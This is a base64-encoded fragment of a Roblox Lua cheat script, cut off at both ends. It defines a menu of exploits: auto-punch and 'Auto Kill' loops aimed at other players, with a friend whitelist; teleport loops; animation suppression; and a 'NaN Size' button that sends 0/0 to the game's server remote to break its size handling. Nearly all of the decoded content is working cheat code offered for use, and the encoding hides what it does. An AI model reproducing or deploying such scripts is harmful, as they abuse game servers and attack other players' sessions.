0YXNrLndhaXQoMC41KQoJCWVuZAoJZW5kKQplbmQKCmxvY2FsIGZ1bmN0aW9uIHN0YXJ0QW50aUZseSgpCglnZXRnZW52KCkuQW50aUZseUFjdGl2ZSA9IHRydWUKCXNhZmVEaXNjb25uZWN0KCJBbnRpRmx5IikKCWNvbm5lY3Rpb25zLkFudGlGbHkgPSBSdW5TZXJ2aWNlLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkKCQlsb2NhbCBjaGFyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCgkJaWYgbm90IGNoYXIgdGhlbiByZXR1cm4gZW5kCgkJbG9jYWwgcm9vdCA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQoJCWlmIG5vdCByb290IHRoZW4gcmV0dXJuIGVuZAoJCWxvY2FsIGh1bWFub2lkID0gY2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKCQlpZiBub3QgaHVtYW5vaWQgdGhlbiByZXR1cm4gZW5kCgkJbG9jYWwgcmF5ID0gUmF5Lm5ldyhyb290LlBvc2l0aW9uLCBWZWN0b3IzLm5ldygwLCAtNTAwLCAwKSkKCQlsb2NhbCBoaXQsIHBvc2l0aW9uID0gd29ya3NwYWNlOkZpbmRQYXJ0T25SYXkocmF5LCBjaGFyKQoJCWlmIGhpdCB0aGVuCgkJCWxvY2FsIGdyb3VuZFkgPSBwb3NpdGlvbi5ZCgkJCWxvY2FsIGN1cnJlbnRZID0gcm9vdC5Qb3NpdGlvbi5ZCgkJCWlmIGN1cnJlbnRZIC0gZ3JvdW5kWSA+IDAuNSB0aGVuCgkJCQlyb290LkNGcmFtZSA9IENGcmFtZS5uZXcocm9vdC5Qb3NpdGlvbi5YLCBncm91bmRZICsgMC41LCByb290LlBvc2l0aW9uLlopCgkJCQlodW1hbm9pZC5QbGF0Zm9ybVN0YW5kID0gdHJ1ZQoJCQkJaHVtYW5vaWQuUGxhdGZvcm1TdGFuZCA9IGZhbHNlCgkJCWVuZAoJCWVuZAoJZW5kKQplbmQKCmxvY2FsIGZ1bmN0aW9uIHNvZnRBbnRpTGFnQW5kU3Vuc2V0KCkKCXBjYWxsKGZ1bmN0aW9uKCkKCQlsb2NhbCBjbGFzc2VzVG9DbGVhbiA9IHtbIlBhcnRpY2xlRW1pdHRlciJdPXRydWUsIFsiVHJhaWwiXT10cnVlLCBbIlNtb2tlIl09dHJ1ZSwgWyJGaXJlIl09dHJ1ZX0KCQlmb3IgXywgb2JqIGluIGlwYWlycyh3b3Jrc3BhY2U6R2V0Q2hpbGRyZW4oKSkgZG8KCQkJaWYgb2JqOklzQSgiTW9kZWwiKSBvciBvYmo6SXNBKCJQYXJ0IikgdGhlbgoJCQkJZm9yIF8sIHN1YiBpbiBpcGFpcnMob2JqOkdldENoaWxkcmVuKCkpIGRvCgkJCQkJaWYgY2xhc3Nlc1RvQ2xlYW5bc3ViLkNsYXNzTmFtZV0gdGhlbgoJCQkJCQlwY2FsbChmdW5jdGlvbigpIHN1YjpEZXN0cm95KCkgZW5kKQoJCQkJCWVuZAoJCQkJZW5kCgkJCWVuZAoJCWVuZAoJCWxvY2FsIHRlcnJhaW4gPSB3b3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJUZXJyYWluIikKCQlpZiB0ZXJyYWluIHRoZW4KCQkJdGVycmFpbi5XYXRlcldhdmVTaXplID0gMAoJCQl0ZXJyYWluLldhdGVyUmVmbGVjdGFuY2UgPSAwCgkJCXRlcnJhaW4uV2F0ZXJUcmFuc3BhcmVuY3kgPSAxCgkJZW5kCgllbmQpCglwY2FsbChmdW5jdGlvbigpCgkJbGlnaHRpbmcuQ2xvY2tUaW1lID0gMTgKCQlsaWdodGluZy5CcmlnaHRuZXNzID0gMS41CgkJbGlnaHRpbmcuT3V0ZG9vckFtYmllbnQgPSBDb2xvcjMuZnJvbVJHQigxNTAsIDEwMCwgODApCgkJbGlnaHRpbmcuRm9nQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDEyMCwgMTAwKQoJCWxpZ2h0aW5nLkZvZ0VuZCA9IDUwMAoJCWZvciBfLCB2IGluIGlwYWlycyhsaWdodGluZzpHZXRDaGlsZHJlbigpKSBkbwoJCQlpZiB2OklzQSgiU2t5IikgdGhlbgoJCQkJcGNhbGwoZnVuY3Rpb24oKSB2OkRlc3Ryb3koKSBlbmQpCgkJCWVuZAoJCWVuZAoJCWxvY2FsIHNreSA9IEluc3RhbmNlLm5ldygiU2t5IikKCQlza3kuTmFtZSA9ICJTdW5zZXRTa3kiCgkJc2t5LlNreWJveEJrID0gInJieGFzc2V0aWQ6Ly8xMzE4ODkwMTciCgkJc2t5LlNreWJveERuID0gInJieGFzc2V0aWQ6Ly8xMzE4ODkwMTciCgkJc2t5LlNreWJveEZ0ID0gInJieGFzc2V0aWQ6Ly8xMzE4ODkwMTciCgkJc2t5LlNreWJveExmID0gInJieGFzc2V0aWQ6Ly8xMzE4ODkwMTciCgkJc2t5LlNreWJveFJ0ID0gInJieGFzc2V0aWQ6Ly8xMzE4ODkwMTciCgkJc2t5LlNreWJveFVwID0gInJieGFzc2V0aWQ6Ly8xMzE4ODkwMTciCgkJc2t5LlN1bkFuZ3VsYXJTaXplID0gMTAKCQlza3kuTW9vbkFuZ3VsYXJTaXplID0gMAoJCXNreS5TdW5UZXh0dXJlSWQgPSAicmJ4YXNzZXRpZDovLzY0NDQzMjk5MiIKCQlza3kuUGFyZW50ID0gbGlnaHRpbmcKCWVuZCkKZW5kCgpsb2NhbCBmdW5jdGlvbiBob29rUmVzZXRPbkNoYXJhY3RlcihjaGFyKQoJaWYgbm90IGNoYXIgdGhlbiByZXR1cm4gZW5kCglsb2NhbCBodW1hbm9pZCA9IGNoYXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCglzYWZlRGlzY29ubmVjdCgiUmVzZXREZWF0aCIpCgljb25uZWN0aW9ucy5SZXNldERlYXRoID0gaHVtYW5vaWQuRGllZDpDb25uZWN0KGZ1bmN0aW9uKCkKCQl0YXNrLndhaXQoMC41KQoJCXJlc3Bhd25QbGF5ZXIoKQoJZW5kKQplbmQKCmxvY2FsIGZ1bmN0aW9uIHN0YXJ0VGlueUlzbGFuZExvb3AoKQoJbG9jYWwgaWQgPSAiVGlueUlzbGFuZExvb3AiCglsb29wc1tpZF0gPSB0cnVlCgl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQlsb2NhbCB0ZWxlcG9ydFBvcyA9IENGcmFtZS5uZXcoLTM3LjEsIDkuMiwgMTkxOSkKCQl3aGlsZSBjb21ib0FjdGl2ZSBhbmQgbG9vcHNbaWRdIGRvCgkJCXBjYWxsKGZ1bmN0aW9uKCkKCQkJCWxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKCQkJCWlmIGNoYXIgYW5kIGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCgkJCQkJY2hhci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IHRlbGVwb3J0UG9zCgkJCQllbmQKCQkJZW5kKQoJCQl0YXNrLndhaXQoMC4yKQoJCWVuZAoJZW5kKQplbmQKCi0tIPCflLkgS2lsbGVyOkFkZFN3aXRjaCB2ZXJzaW9uCktpbGxlcjpBZGRTd2l0Y2goIk9QIFB1bmNoIFdoZW4gRGVhZCB8IENvbWJvIiwgZnVuY3Rpb24oZW5hYmxlZCkKCWNvbWJvQWN0aXZlID0gZW5hYmxlZAoJY2xlYW51cEFsbCgpCgoJaWYgZW5hYmxlZCB0aGVuCgkJYXBwbHlTaXplTmFOKCkKCQlzdGFydEF1dG9QdW5jaCgpCgkJc3RhcnRQcm90ZWluRWdnTG9naWMoKQoJCXN0YXJ0QW50aUZseSgpCgkJc29mdEFudGlMYWdBbmRTdW5zZXQoKQoJCXN0YXJ0VGlueUlzbGFuZExvb3AoKQoKCQlpZiBMb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbgoJCQlob29rUmVzZXRPbkNoYXJhY3RlcihMb2NhbFBsYXllci5DaGFyYWN0ZXIpCgkJZW5kCgkJc2FmZURpc2Nvbm5lY3QoIkNoYXJhY3RlckFkZGVkUmVzZXQiKQoJCWNvbm5lY3Rpb25zLkNoYXJhY3RlckFkZGVkUmVzZXQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKGNoYXIpCgkJCXRhc2sud2FpdCgwLjUpCgkJCWhvb2tSZXNldE9uQ2hhcmFjdGVyKGNoYXIpCgkJZW5kKQoJZW5kCmVuZCkKCktpbGxlcjpBZGRCdXR0b24oIk5hTiBTaXplIiwgZnVuY3Rpb24oKQogICAgbG9jYWwgYXJncyA9IHsiY2hhbmdlU2l6ZSIsIDAvMH0KICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKTpXYWl0Rm9yQ2hpbGQoInJFdmVudHMiKTpXYWl0Rm9yQ2hpbGQoImNoYW5nZVNwZWVkU2l6ZVJlbW90ZSIpOkludm9rZVNlcnZlcih1bnBhY2soYXJncykpCmVuZCkKCmxvY2FsIGJ1dHRvbiA9IEtpbGxlcjpBZGRCdXR0b24oIlJlbW92ZSBQdW5jaCBBbmltIiwgZnVuY3Rpb24oKQogICAgbG9jYWwgYmxvY2tlZEFuaW1hdGlvbnMgPSB7CiAgICAgICAgWyJyYnhhc3NldGlkOi8vMzYzODcyOTA1MyJdID0gdHJ1ZSwKICAgICAgICBbInJieGFzc2V0aWQ6Ly8zNjM4NzY3NDI3Il0gPSB0cnVlLAogICAgfQoKICAgIGxvY2FsIGZ1bmN0aW9uIHNldHVwQW5pbWF0aW9uQmxvY2tpbmcoKQogICAgICAgIGxvY2FsIGNoYXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgaWYgbm90IGNoYXIgb3Igbm90IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgdGhlbiByZXR1cm4gZW5kCgogICAgICAgIGxvY2FsIGh1bWFub2lkID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQoKICAgICAgICBmb3IgXywgdHJhY2sgaW4gcGFpcnMoaHVtYW5vaWQ6R2V0UGxheWluZ0FuaW1hdGlvblRyYWNrcygpKSBkbwogICAgICAgICAgICBpZiB0cmFjay5BbmltYXRpb24gdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgYW5pbUlkID0gdHJhY2suQW5pbWF0aW9uLkFuaW1hdGlvbklkCiAgICAgICAgICAgICAgICBsb2NhbCBhbmltTmFtZSA9IHRyYWNrLk5hbWU6bG93ZXIoKQoKICAgICAgICAgICAgICAgIGlmIGJsb2NrZWRBbmltYXRpb25zW2FuaW1JZF0gb3IKICAgICAgICAgICAgICAgICAgICBhbmltTmFtZTptYXRjaCgicHVuY2giKSBvcgogICAgICAgICAgICAgICAgICAgIGFuaW1OYW1lOm1hdGNoKCJhdHRhY2siKSBvcgogICAgICAgICAgICAgICAgICAgIGFuaW1OYW1lOm1hdGNoKCJyaWdodCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICB0cmFjazpTdG9wKCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgaWYgbm90IF9HLkFuaW1CbG9ja0Nvbm5lY3Rpb24gdGhlbgogICAgICAgICAgICBsb2NhbCBjb25uZWN0aW9uID0gaHVtYW5vaWQuQW5pbWF0aW9uUGxheWVkOkNvbm5lY3QoZnVuY3Rpb24odHJhY2spCiAgICAgICAgICAgICAgICBpZiB0cmFjay5BbmltYXRpb24gdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGFuaW1JZCA9IHRyYWNrLkFuaW1hdGlvbi5BbmltYXRpb25JZAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGFuaW1OYW1lID0gdHJhY2suTmFtZTpsb3dlcigpCgogICAgICAgICAgICAgICAgICAgIGlmIGJsb2NrZWRBbmltYXRpb25zW2FuaW1JZF0gb3IKICAgICAgICAgICAgICAgICAgICAgICAgYW5pbU5hbWU6bWF0Y2goInB1bmNoIikgb3IKICAgICAgICAgICAgICAgICAgICAgICAgYW5pbU5hbWU6bWF0Y2goImF0dGFjayIpIG9yCiAgICAgICAgICAgICAgICAgICAgICAgIGFuaW1OYW1lOm1hdGNoKCJyaWdodCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdHJhY2s6U3RvcCgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgX0cuQW5pbUJsb2NrQ29ubmVjdGlvbiA9IGNvbm5lY3Rpb24KICAgICAgICBlbmQKICAgIGVuZAoKICAgIHNldHVwQW5pbWF0aW9uQmxvY2tpbmcoKQoKICAgIGxvY2FsIGZ1bmN0aW9uIG92ZXJyaWRlVG9vbEFjdGl2YXRpb24oKQogICAgICAgIGxvY2FsIGZ1bmN0aW9uIHByb2Nlc3NUb29sKHRvb2wpCiAgICAgICAgICAgIGlmIHRvb2wgYW5kICh0b29sLk5hbWUgPT0gIlB1bmNoIiBvciB0b29sLk5hbWU6bWF0Y2goIkF0dGFjayIpIG9yIHRvb2wuTmFtZTptYXRjaCgiUmlnaHQiKSkgdGhlbgogICAgICAgICAgICAgICAgaWYgbm90IHRvb2w6R2V0QXR0cmlidXRlKCJBY3RpdmF0ZWRPdmVycmlkZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICB0b29sOlNldEF0dHJpYnV0ZSgiQWN0aXZhdGVkT3ZlcnJpZGUiLCB0cnVlKQoKICAgICAgICAgICAgICAgICAgICBsb2NhbCBjb25uZWN0aW9uID0gdG9vbC5BY3RpdmF0ZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgY2hhciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2hhciBhbmQgY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgdHJhY2sgaW4gcGFpcnMoY2hhci5IdW1hbm9pZDpHZXRQbGF5aW5nQW5pbWF0aW9uVHJhY2tzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdHJhY2suQW5pbWF0aW9uIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYW5pbUlkID0gdHJhY2suQW5pbWF0aW9uLkFuaW1hdGlvbklkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGFuaW1OYW1lID0gdHJhY2suTmFtZTpsb3dlcigpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBibG9ja2VkQW5pbWF0aW9uc1thbmltSWRdIG9yCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhbmltTmFtZTptYXRjaCgicHVuY2giKSBvcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYW5pbU5hbWU6bWF0Y2goImF0dGFjayIpIG9yCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhbmltTmFtZTptYXRjaCgicmlnaHQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cmFjazpTdG9wKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgICAgICBpZiBub3QgX0cuVG9vbENvbm5lY3Rpb25zIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgX0cuVG9vbENvbm5lY3Rpb25zID0ge30KICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBfRy5Ub29sQ29ubmVjdGlvbnNbdG9vbF0gPSBjb25uZWN0aW9uCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIGZvciBfLCB0b29sIGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBwcm9jZXNzVG9vbCh0b29sKQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBjaGFyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIGNoYXIgdGhlbgogICAgICAgICAgICBmb3IgXywgdG9vbCBpbiBwYWlycyhjaGFyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBwcm9jZXNzVG9vbCh0b29sKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKICAgICAgICBpZiBub3QgX0cuQmFja3BhY2tBZGRlZENvbm5lY3Rpb24gdGhlbgogICAgICAgICAgICBfRy5CYWNrcGFja0FkZGVkQ29ubmVjdGlvbiA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjay5DaGlsZEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oY2hpbGQpCiAgICAgICAgICAgICAgICBpZiBjaGlsZDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgICAgICAgICBwcm9jZXNzVG9vbChjaGlsZCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCgogICAgICAgIGlmIG5vdCBfRy5DaGFyYWN0ZXJUb29sQWRkZWRDb25uZWN0aW9uIGFuZCBjaGFyIHRoZW4KICAgICAgICAgICAgX0cuQ2hhcmFjdGVyVG9vbEFkZGVkQ29ubmVjdGlvbiA9IGNoYXIuQ2hpbGRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKGNoaWxkKQogICAgICAgICAgICAgICAgaWYgY2hpbGQ6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICAgICAgcHJvY2Vzc1Rvb2woY2hpbGQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kCgogICAgb3ZlcnJpZGVUb29sQWN0aXZhdGlvbigpCgogICAgaWYgbm90IF9HLkFuaW1Nb25pdG9yQ29ubmVjdGlvbiB0aGVuCiAgICAgICAgX0cuQW5pbU1vbml0b3JDb25uZWN0aW9uID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikuSGVhcnRiZWF0OkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiB0aWNrKCkgJSAwLjUgPCAwLjAxIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGNoYXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBpZiBjaGFyIGFuZCBjaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBmb3IgXywgdHJhY2sgaW4gcGFpcnMoY2hhci5IdW1hbm9pZDpHZXRQbGF5aW5nQW5pbWF0aW9uVHJhY2tzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRyYWNrLkFuaW1hdGlvbiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBhbmltSWQgPSB0cmFjay5BbmltYXRpb24uQW5pbWF0aW9uSWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGFuaW1OYW1lID0gdHJhY2suTmFtZTpsb3dlcigpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgYmxvY2tlZEFuaW1hdGlvbnNbYW5pbUlkXSBvcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFuaW1OYW1lOm1hdGNoKCJwdW5jaCIpIG9yCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYW5pbU5hbWU6bWF0Y2goImF0dGFjayIpIG9yCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYW5pbU5hbWU6bWF0Y2goInJpZ2h0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyYWNrOlN0b3AoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAoKICAgIGlmIG5vdCBfRy5DaGFyYWN0ZXJBZGRlZENvbm5lY3Rpb24gdGhlbgogICAgICAgIF9HLkNoYXJhY3RlckFkZGVkQ29ubmVjdGlvbiA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKG5ld0NoYXIpCiAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICBzZXR1cEFuaW1hdGlvbkJsb2NraW5nKCkKICAgICAgICAgICAgb3ZlcnJpZGVUb29sQWN0aXZhdGlvbigpCgogICAgICAgICAgICBpZiBfRy5DaGFyYWN0ZXJUb29sQWRkZWRDb25uZWN0aW9uIHRoZW4KICAgICAgICAgICAgICAgIF9HLkNoYXJhY3RlclRvb2xBZGRlZENvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgX0cuQ2hhcmFjdGVyVG9vbEFkZGVkQ29ubmVjdGlvbiA9IG5ld0NoYXIuQ2hpbGRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKGNoaWxkKQogICAgICAgICAgICAgICAgaWYgY2hpbGQ6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICAgICAgcHJvY2Vzc1Rvb2woY2hpbGQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZCkKICAgIGVuZAplbmQpCgpmdW5jdGlvbiBSZWNvdmVyeVB1bmNoKCkKICAgIGlmIF9HLkFuaW1CbG9ja0Nvbm5lY3Rpb24gdGhlbgogICAgICAgIF9HLkFuaW1CbG9ja0Nvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgX0cuQW5pbUJsb2NrQ29ubmVjdGlvbiA9IG5pbAogICAgZW5kCiAgICBpZiBfRy5BbmltTW9uaXRvckNvbm5lY3Rpb24gdGhlbgogICAgICAgIF9HLkFuaW1Nb25pdG9yQ29ubmVjdGlvbjpEaXNjb25uZWN0KCkKICAgICAgICBfRy5BbmltTW9uaXRvckNvbm5lY3Rpb24gPSBuaWwKICAgIGVuZAogICAgaWYgX0cuVG9vbENvbm5lY3Rpb25zIHRoZW4KICAgICAgICBmb3IgXywgY29ubiBpbiBwYWlycyhfRy5Ub29sQ29ubmVjdGlvbnMpIGRvCiAgICAgICAgICAgIGlmIGNvbm4gdGhlbiBjb25uOkRpc2Nvbm5lY3QoKSBlbmQKICAgICAgICBlbmQKICAgICAgICBfRy5Ub29sQ29ubmVjdGlvbnMgPSBuaWwKICAgIGVuZAogICAgaWYgX0cuQmFja3BhY2tBZGRlZENvbm5lY3Rpb24gdGhlbgogICAgICAgIF9HLkJhY2twYWNrQWRkZWRDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQogICAgICAgIF9HLkJhY2twYWNrQWRkZWRDb25uZWN0aW9uID0gbmlsCiAgICBlbmQKICAgIGlmIF9HLkNoYXJhY3RlclRvb2xBZGRlZENvbm5lY3Rpb24gdGhlbgogICAgICAgIF9HLkNoYXJhY3RlclRvb2xBZGRlZENvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgX0cuQ2hhcmFjdGVyVG9vbEFkZGVkQ29ubmVjdGlvbiA9IG5pbAogICAgZW5kCiAgICBpZiBfRy5DaGFyYWN0ZXJBZGRlZENvbm5lY3Rpb24gdGhlbgogICAgICAgIF9HLkNoYXJhY3RlckFkZGVkQ29ubmVjdGlvbjpEaXNjb25uZWN0KCkKICAgICAgICBfRy5DaGFyYWN0ZXJBZGRlZENvbm5lY3Rpb24gPSBuaWwKICAgIGVuZAplbmQKCktpbGxlcjpBZGRCdXR0b24oIlJlY292ZXIgUHVuY2ggQW5pbSIsIGZ1bmN0aW9uKCkKICAgIFJlY292ZXJ5UHVuY2goKQplbmQpCgpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIGZyaWVuZFdoaXRlbGlzdEFjdGl2ZSA9IGZhbHNlCgpLaWxsZXI6QWRkU3dpdGNoKCJBdXRvIFdoaXRlbGlzdCBGcmllbmRzIChGYXN0IEZ1bmN0aW9uKSAiLCBmdW5jdGlvbihzdGF0ZSkKICAgIGZyaWVuZFdoaXRlbGlzdEFjdGl2ZSA9IHN0YXRlCgogICAgaWYgc3RhdGUgdGhlbgogICAgICAgIGZvciBfLCBwbGF5ZXIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgYW5kIExvY2FsUGxheWVyOklzRnJpZW5kc1dpdGgocGxheWVyLlVzZXJJZCkgdGhlbgogICAgICAgICAgICAgICAgcGxheWVyV2hpdGVsaXN0W3BsYXllci5OYW1lXSA9IHRydWUKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIFBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpCiAgICAgICAgICAgIGlmIGZyaWVuZFdoaXRlbGlzdEFjdGl2ZSBhbmQgcGxheWVyIH49IExvY2FsUGxheWVyIGFuZCBMb2NhbFBsYXllcjpJc0ZyaWVuZHNXaXRoKHBsYXllci5Vc2VySWQpIHRoZW4KICAgICAgICAgICAgICAgIHBsYXllcldoaXRlbGlzdFtwbGF5ZXIuTmFtZV0gPSB0cnVlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVsc2UKICAgICAgICBmb3IgbmFtZSBpbiBwYWlycyhwbGF5ZXJXaGl0ZWxpc3QpIGRvCiAgICAgICAgICAgIGxvY2FsIGZyaWVuZCA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQobmFtZSkKICAgICAgICAgICAgaWYgZnJpZW5kIGFuZCBMb2NhbFBsYXllcjpJc0ZyaWVuZHNXaXRoKGZyaWVuZC5Vc2VySWQpIHRoZW4KICAgICAgICAgICAgICAgIHBsYXllcldoaXRlbGlzdFtuYW1lXSA9IG5pbAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpLaWxsZXI6QWRkVGV4dEJveCgiV2hpdGVsaXN0IiwgZnVuY3Rpb24odGV4dCkKICAgIGxvY2FsIHRhcmdldCA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQodGV4dCkKICAgIGlmIHRhcmdldCB0aGVuCiAgICAgICAgcGxheWVyV2hpdGVsaXN0W3RhcmdldC5OYW1lXSA9IHRydWUKICAgIGVuZAplbmQpCgpLaWxsZXI6QWRkVGV4dEJveCgiVW5XaGl0ZWxpc3QiLCBmdW5jdGlvbih0ZXh0KQogICAgbG9jYWwgdGFyZ2V0ID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZCh0ZXh0KQogICAgaWYgdGFyZ2V0IHRoZW4KICAgICAgICBwbGF5ZXJXaGl0ZWxpc3RbdGFyZ2V0Lk5hbWVdID0gbmlsCiAgICBlbmQKZW5kKQoKS2lsbGVyOkFkZFN3aXRjaCgiQXV0byBLaWxsIiwgZnVuY3Rpb24oYm9vbCkKICAgIGF1dG9LaWxsID0gYm9vbAoKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGF1dG9LaWxsIGRvCiAgICAgICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgICAgICAgICAgbG9jYWwgcmlnaHRIYW5kID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJSaWdodEhhbmQiKQogICAgICAgICAgICBsb2NhbCBsZWZ0SGFuZCA9IGNoYXJhY3R